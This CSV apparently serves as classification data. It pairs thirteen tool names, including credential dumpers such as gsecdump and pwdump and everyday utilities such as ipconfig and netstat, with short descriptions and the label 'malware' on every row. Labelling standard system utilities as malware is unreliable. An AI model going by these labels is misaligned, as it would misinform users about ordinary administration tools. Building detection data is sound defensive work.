name,description,label
dsquery,is a command-line utility that can be used to query Active Directory for information from a system within a domain.  It is typically installed only on Windows Server versions but can be installed on non-server variants through the Microsoft-provided Remote Server Administration Tools bundle.,malware
esentutl,is a command-line tool that provides database utilities for the Windows Extensible Storage Engine.,malware
gsecdump,is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems. ,malware
ifconfig,is a Unix-based utility used to gather information about and interact with the TCP/IP settings on a system. ,malware
ipconfig,"is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. ",malware
meek,is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.,malware
nbtstat,is a utility used to troubleshoot NetBIOS name resolution. ,malware
netsh,is a scripting utility used to interact with networking components on local or remote systems. ,malware
netstat,"is an operating system utility that displays active TCP connections, listening ports, and network statistics. ",malware
pwdump,is a credential dumper. ,malware
route,can be used to find or change information within the local system IP routing table. ,malware
schtasks,is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time. ,malware
spwebmember,is a Microsoft SharePoint enumeration and data dumping tool written in .NET. ,malware
